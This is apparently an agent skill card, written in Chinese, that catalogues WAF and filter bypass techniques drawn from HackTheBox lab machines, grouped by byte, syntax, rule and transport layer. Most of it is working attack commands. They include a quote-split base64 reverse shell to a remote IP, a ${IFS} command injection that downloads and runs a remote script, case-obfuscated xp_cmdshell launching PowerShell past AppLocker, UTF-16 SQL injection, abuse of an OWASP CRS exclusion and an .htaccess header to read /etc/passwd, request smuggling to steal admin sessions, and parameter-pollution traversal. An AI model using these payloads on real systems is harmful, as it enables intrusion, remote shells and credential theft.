---
name: 'waf-filter-bypass-patterns'
description: 'WAF 与过滤层绕过，按过滤层分类而非按 payload：字节层（UTF-16 \u00xx / 大小写混淆 / unicode 变形）、语法层（引号拼接 / ${IFS} / 符号链接替代）、规则层（OWASP CRS 规则排除 / 路径归一化差异 / .htaccess 改写）、传输层（分块 / 重复头 / 参数污染）。6 台 Insane 命中。（检索词：WAF bypass/ModSecurity/OWASP CRS/rule exclusion/unicode/UTF-16/大小写混淆/引号拼接/${IFS}/Transfer-Encoding/chunked/参数污染/403 bypass/绕过过滤/WAF-bypass/OWASP-CRS/rule-exclusion/UTF 16/Transfer Encoding/filter/patterns）'
whenToUse: 'payload 逻辑正确却被 403/400 拦掉、或能跑的命令换成 ls/curl 就失败时加载；先判"拦在哪一层"，再挑手法。'
metadata: { domain: web, tier: T2 }
---

# WAF 与过滤层绕过：按过滤层而不是按 payload 分类

> Insane 官方 WP 逐台回核，**6 台命中**：Multimaster / Fighter / Sekhmet / Smasher2 / PikaTwoo / Zero（Sink、Ouija、Stacked、Bookworm 同族补充）

> 🔴 与 `command-injection-regex-bypass` 分工：本卡管**通用过滤层**（谁在拦、拦在哪层）；那张卡管**命令注入的具体正则 payload**。

## 触发信号

| 可观察现象 | 拦在哪层 |
|---|---|
| 带 `'` 或 `1=1` 的请求 403，去掉引号就正常 | 字节层（关键字匹配） |
| 响应头有 `Server: ModSecurity`，或 CHANGELOG 提到 OWASP CRS | 规则层（可打规则集） |
| `whoami` 能跑，`ls`/`curl`/`wget` 却 403 | 字节层（关键词黑名单） |
| 所有含 `private`/`dev` 的路径一律 403，`/public/..%2Fprivate/` 也不行 | 规则层（未归一化前缀正则） |
| `Via: haproxy` + 后端 `Server: Gunicorn 20.0.0` | 传输层（CL-TE 前提） |
| 能上传 `.htaccess` 或改服务器配置 | 配置层（直接改写过滤器） |

## 前置验证

```bash
# 1. 谁在拦
curl -sI http://TARGET/ | grep -i 'server\|x-powered\|via'
# 2. 二分出触发字符
curl -s -o /dev/null -w '%{http_code}\n' "http://TARGET/?q=test'"
curl -s -o /dev/null -w '%{http_code}\n' "http://TARGET/?q=test"
# 3. 关键词黑名单 vs 语法检测：whoami 通、ls 403 = 关键词
```

## 模式 1: 字节层 —— 编码、大小写、unicode 变形

过滤器在**字节/字符**层匹配关键字，而目标语言有自己的解码或大小写折叠。

```bash
# ① UTF-16 \u00xx 绕基于字节的 WAF（Multimaster/MSSQL）
#    JSON RFC 原生支持 UTF-16，后端解码而 WAF 不解
python2 -c "i=raw_input(); print ''.join('\\\\u00'+hex(ord(c)).split('x')[1] for c in i)"
# 输入 ' or 1=1-- -  →  \u0027\u0020\u006f\u0072... 塞进 JSON 的 name 字段

# ② 大小写混淆绕黑名单（Fighter/MSSQL）
Xp_cmdsHelL 'C:\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe ...'
# 🔴 > 和 " 要转义；必须用 32 位 SysWOW64 的 powershell（AppLocker 只拦 System32）
```

| 机器 | 细节 |
|---|---|
| Multimaster | `name` 字段 UTF-16 编码 `' or 1=1-- -` 绕字节 WAF；库 `Hub_DB` |
| Fighter | `Xp_cmdsHelL` + SysWOW64 `poWersHeLl.Exe` 绕黑名单与 AppLocker |
| Sekhmet | 把 `_$$ND_FUNC$$_` 与 `function` 的字符换成 `\u00xx`（`\u004e`=N、`\u0044`=D、`\u0066`=f）绕 ModSecurity，`profile` cookie 反序列化回弹 shell |

## 模式 2: 语法层 —— 拼接、注释、等价写法

过滤器匹配**字符串字面量**，而 shell/语言执行前还会再解析一层。

```bash
# ① 引号拼接（Smasher2）：bash 把相邻引号片段拼成一个词，WAF 只看到碎片
l's'                                              # 等价于 ls
ec''ho 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYxCg==' |
  'b'a''s''e'6'4 -'d'| b'a''s'h
# 🔴 引号总数必须是偶数，否则 shell 一直等下一个引号

# ② ${IFS} 替代空格（Stacked/Rope）：请求行不能含空格时
--function-name "api;wget\${IFS}10.10.14.43/runme.sh;bash\${IFS}runme.sh"
```

| 机器 | 细节 |
|---|---|
| Smasher2 | `l's'`、`ec''ho`、`'b'a''s''e'6'4 -'d'` 绕 WAF（WAF 看不到最终命令行） |
| Stacked / Rope | `${IFS}` 顶替空格,让含空格的命令在请求行/参数里合法通过(Rope 侧是**传输约束**而非 WAF 规则:HTTP 请求行本身不能含空格) |

## 模式 3: 规则层 —— CRS 排除、归一化差异、改写过滤器本身

过滤器是**可枚举的规则集**，或前后端对同一路径解释不一致。

```bash
# ① OWASP CRS 规则排除（PikaTwoo）：REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf
#    的 id:9001180 链式规则匹配 POST + /admin/content/assets/add/[a-z]+$ + cookie
#    SESS[a-f0-9] → ctl:requestBodyAccess=Off（整个 body 免检）
curl -b "SESS0=a" -d "region=../../../../../../etc/passwd" \
  "http://pokatdex-api-v1.pokatmon-app.htb//admin/content/assets/add/a"

# ② 改写过滤层本身（Zero）：能写 .htaccess 时直接开一条读文件通道
echo 'Header always set X-Leak "expr=%{base64:%{file:/etc/passwd}}"' >> .htaccess
curl -I http://zero.vl/~zro-9c53d89c/     # X-Leak 响应头 = base64 的 /etc/passwd
```

🔴 Zero 这条读的是**响应头**不是 body，必须用 `curl -I` 或 `-i`。

| 机器 | 细节 |
|---|---|
| PikaTwoo | CRS Drupal 排除规则绕掉全部 body 检查；APISIX 对未归一化的 `ctx.var.request_uri` 做 `re_find`，`/privat%65/` 绕前缀正则（CVE-2021-43557） |
| Zero | SFTP 写 `public_html/.htaccess`，mod_headers `expr=%{base64:%{file:...}}` 任意读 → `zroadmin` 凭据 |

## 模式 4: 传输层 —— 分块、重复头、参数污染

拦截发生在前端代理与后端对**同一报文**的解析分歧上。

```bash
# ① Transfer-Encoding 塞控制字符（Sink）：\v（0x0b）让 HAProxy 回退到 Content-Length，
#    Gunicorn 仍认 chunked
python3 -c "import base64; print(base64.b64encode(b'\x0b'))"   # → Cw==
# Transfer-Encoding: Cw==chunked + Connection: keep-alive
# body: 8 / msg=test / 0 再拼第二个 POST → 下一个用户的请求被当评论 body，泄漏其 session

# ② 同名参数重复（HPP）：过滤器只看第一个值，后端拼了第二个
?bookIds=13&bookIds=../../../../../../etc/passwd
```

| 机器 | 细节 |
|---|---|
| Sink | `Transfer-Encoding: Cw==chunked`（垂直 tab）造 CL-TE，偷 admin 会话 |
| Bookworm | `bookIds=13&bookIds=../../../../../../../etc/passwd` 多值参数叠加穿越 |

## 🔴 与 `command-injection-regex-bypass` 的分工

| | 本卡 | `command-injection-regex-bypass` |
|---|---|---|
| 管的层 | **通用过滤层**：字节编码、语法拼接、CRS 规则、传输层 | **命令注入的具体正则 payload** |
| 回答 | "谁在拦我？拦在哪一层？" | "命令注入的 `$()` 为什么没执行？" |
| 覆盖 | UTF-16、unicode 变形、大小写、CRS 排除、分块 | `$(...)` 无条件执行、`python chr()`、`%`→`%25` 陷阱 |

**先判层再选卡**：连"是 WAF 还是应用自己拦的"都没确认，先做前置验证；已确认命令注入且只是正则不匹配，转那张卡。

## 快速检查清单

```bash
[ ] 响应头有 ModSecurity / OWASP CRS / Via: haproxy 吗
[ ] 逐字符删减二分出触发拦截的字符
[ ] 试过大小写混淆（Xp_cmdsHelL / poWersHeLl.Exe）
[ ] 试过 \u00xx / UTF-16 编码整个 payload
[ ] 试过引号拼接（l's'、ec''ho）—— 引号数必须偶数
[ ] 空格被拦时试过 ${IFS}
```

## 教训

1. **先判层，再选 payload** —— 403 第一件事是看 Server 头，"谁在拦"决定完全不同的打法。
2. **黑名单是字符串比对，解析器是语义执行** —— 落差就是绕过空间。Fighter 的大小写与 Smasher2 的引号拼接本质同一件事。
3. **编码要选目标语言真正支持的** —— Multimaster 用 UTF-16 而非 URL 编码，因为 JSON RFC 原生支持它。
4. **CRS 排除规则是公开的** —— `ctl:requestBodyAccess=Off` 直接让整个 body 免检。
5. **拦截不一定在 payload 上** —— 也可能在传输层（Sink 的 `\v`）或配置层（Zero 的 `.htaccess`）。

## 相关卡

- `command-injection-regex-bypass` —— 已确认命令注入点、只差正则 payload 时（见分工表）
- `broken-access-control-idor` —— 绕过对象是 ACL 前缀/属主校验而非 WAF 时
- `http-request-smuggling` —— Sink / Ouija 那类 CL-TE 与长头名的完整打法
- `web-attacks` —— 技术栈识别与注入总手册
